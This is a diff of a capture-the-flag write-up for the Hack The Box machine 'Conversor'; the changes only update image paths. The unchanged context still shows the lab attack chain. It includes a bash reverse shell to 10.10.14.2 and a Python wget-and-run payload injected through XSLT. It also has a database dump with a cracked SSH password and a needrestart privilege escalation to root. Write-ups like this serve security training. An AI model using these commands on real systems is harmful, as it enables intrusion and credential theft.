@@ -4,7 +4,7 @@ The machine Conversor gives me an IP address and than says good luck bring me th
 **Recon**
 
 First I start with the Recon phase, that meaning I can start with an nmap scan to uncover open ports
-![Pasted image 20251206092712](Pasted%20image%2020251206092712.png)
+![Pasted image 20251206092712](Image/Pasted%20image%2020251206092712.png)
 The scan shows 2 open ports:
 - port 22 - for ssh
 - port 80 - open for a web server having the domain `conversor.htb`(we also had to put the domain in `/etc/hosts`)
@@ -14,20 +14,20 @@ The scan shows 2 open ports:
 Next step in our journey is to inspect the webserver, so we are going to use the `burpsuite` tool to see the requests and responses while we wander through the files of the webserver
 
 On the first interaction with the webserver we are met with a `login` form and also an option to register
-![Pasted image 20251206093100](Pasted%20image%2020251206093100.png)
+![Pasted image 20251206093100](Image/Pasted%20image%2020251206093100.png)
 
 Following the `Register` redirect I found a register form so I decide to create a test account to login and see what the webserver hides behind these forms
-![Pasted image 20251206093321](Pasted%20image%2020251206093321.png)
+![Pasted image 20251206093321](Image/Pasted%20image%2020251206093321.png)
 
 After login we are redirected to the main page which holds a converter of nmap scans
-![Pasted image 20251206093433](Pasted%20image%2020251206093433.png)
+![Pasted image 20251206093433](Image/Pasted%20image%2020251206093433.png)
 The user has to give to the web server an xml file containing the nmap scan along with an XSLT sheet to transform it into a more aesthetic format
 - The site also gives us a template which is a simple format for an nmap scan
 
 To test the site I downloaded the example `XSLT` file and also did an nmap scan of this IP address but this time I selected the output to be in an `XML` file with the command
 `nmap -A -T4 10.10.11.92 -oX`
 - After I uploaded the 2 files I got a link to my result
-![Pasted image 20251206094153](Pasted%20image%2020251206094153.png)
+![Pasted image 20251206094153](Image/Pasted%20image%2020251206094153.png)
 
 Now after I saw how this works my mind instantly went to the fact that this has to be 100% exploitable and I can introduce some malicious code in the `XSLT` file since that is the file that works with the processing par
 
@@ -47,10 +47,10 @@ Having this in mind now I have to find what processor it is and for that the pdf
  Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"/><br/> 
 ```
 I introduce all this information in the XSLT sheet
-![Pasted image 20251206100400](Pasted%20image%2020251206100400.png)
+![Pasted image 20251206100400](Image/Pasted%20image%2020251206100400.png)
 
 Now its time to check by uploading a scan and the modified XSLT sheet
-![Pasted image 20251206100505](Pasted%20image%2020251206100505.png)
+![Pasted image 20251206100505](Image/Pasted%20image%2020251206100505.png)
 The script worked and it gave me valuable information:
 - The version of the processor is `1.0`
 - The processor is `libxslt` => it is run in python/php/ruby/perl
@@ -70,38 +70,38 @@ bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
 import os
 os.system("wget http://10.10.14.2:80/shell.sh; bash ./shell.sh")
 ```
-![Pasted image 20251206101933](Pasted%20image%2020251206101933.png)
+![Pasted image 20251206101933](Image/Pasted%20image%2020251206101933.png)
 3. I open a web server with `python3 -m http.server 80`
 4. I open a `netcat` listener on another terminal with `nc -lvnp 4444`
 5. Finally hope it's working because I am lazy and don't want to test for the other programming languages
 
 What a surprise IT WORKED and it gave me a reverse shell as the `www-data`
-![Pasted image 20251206102750](Pasted%20image%2020251206102750.png)
+![Pasted image 20251206102750](Image/Pasted%20image%2020251206102750.png)
 
 **Privilege Escalation**
 
 Having a shell as the `www-data` I decided to look around for potential leakage of important data through the server
 
 Int the home folder of the user I found the `conversor.htb` directory which holds data about the application itself
-![Pasted image 20251206103237](Pasted%20image%2020251206103237.png)
+![Pasted image 20251206103237](Image/Pasted%20image%2020251206103237.png)
 Going further inside the `instance` directory I found a database named `users.db`
-![Pasted image 20251206103435](Pasted%20image%2020251206103435.png)
+![Pasted image 20251206103435](Image/Pasted%20image%2020251206103435.png)
 After this discovery I used `sqlite3 users.db` to gain access to that database and with a query I discovered some usernames and hashed passwords
-![Pasted image 20251206103555](Pasted%20image%2020251206103555.png)
+![Pasted image 20251206103555](Image/Pasted%20image%2020251206103555.png)
 
 Using `CrackStation` to help me crack these hashes I discovered that only one user could be important, that being the `fismathack` user
-![Pasted image 20251206103720](Pasted%20image%2020251206103720.png)
+![Pasted image 20251206103720](Image/Pasted%20image%2020251206103720.png)
 
 Now let's try to connect to the user account through ssh with the credentials:
 - username: `fismathack`
 - password: `Keepmesafeandwarm`
 The connection went through and I gained access to the `fismathack` user account and also found the user flag in `user.txt`
-![Pasted image 20251206103915](Pasted%20image%2020251206103915.png)
+![Pasted image 20251206103915](Image/Pasted%20image%2020251206103915.png)
 
 # System Flag
 
 In the process of gaining access to the `root` user I started by uncovering if and what the user can run with `sudo`
-![Pasted image 20251206104213](Pasted%20image%2020251206104213.png)
+![Pasted image 20251206104213](Image/Pasted%20image%2020251206104213.png)
 - The user can run alongside `sudo` the command `/usr/sbin/needrestart`
 - Checking the version of the `needrestart` binary we discover it runs on version 3.7
 
@@ -128,10 +128,10 @@ gcc -shared -fPIC -o ./__init__.so lib.c
 ```shell
 PYTHONPATH="$PWD" python3 e.py
 ```
-![Pasted image 20251206111652](Pasted%20image%2020251206111652.png)
+![Pasted image 20251206111652](Image/Pasted%20image%2020251206111652.png)
 6. From another terminal run the `needrestart` script with `sudo` permissions
 7. On the terminal where you ran `e.py` there should be a shell appearing 
 8. If nothing appears check if the file `e.py` is still there and if not transfer it again on the target 
 
 Finally we got the shell as the `root` user and now we can get the system flag
-![Pasted image 20251206111825](Pasted%20image%2020251206111825.png)
+![Pasted image 20251206111825](Image/Pasted%20image%2020251206111825.png)
